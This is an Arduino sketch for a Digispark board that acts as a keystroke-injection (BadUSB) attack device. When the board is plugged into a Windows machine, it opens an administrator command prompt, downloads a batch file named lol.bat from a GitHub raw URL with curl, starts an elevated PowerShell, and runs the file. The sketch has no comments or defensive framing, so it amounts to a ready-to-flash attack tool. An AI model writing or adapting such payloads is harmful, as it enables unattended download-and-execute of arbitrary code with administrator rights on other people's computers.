#include "DigiKeyboard.h"
#define MOD_GUI_LEFT        (1<<3)  //00001000
#define KEY_ENTER   40
#define KEY_SHIFT           (1<<1)  //00000010
#define MOD_CONTROL_LEFT    1
#define KEY_R 52
#define KEY_LEFTARROW 80
#define KEY_RIGHTARROW 79
#define KEY_DOWNARROW  81
#define KEY_BACKSLASH         0x31 

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(700); 
  DigiKeyboard.sendKeyStroke(KEY_RIGHTARROW);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_DOWNARROW);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); 
  DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd c:");
  DigiKeyboard.sendKeyStroke(KEY_BACKSLASH);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("curl https://raw.githubusercontent.com/randomguyhehehe/lol/main/lol.bat > lol.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("start-process PowerShell -verb runas");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); 
  DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(".");
  DigiKeyboard.sendKeyStroke(KEY_BACKSLASH);
  DigiKeyboard.print("lol.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
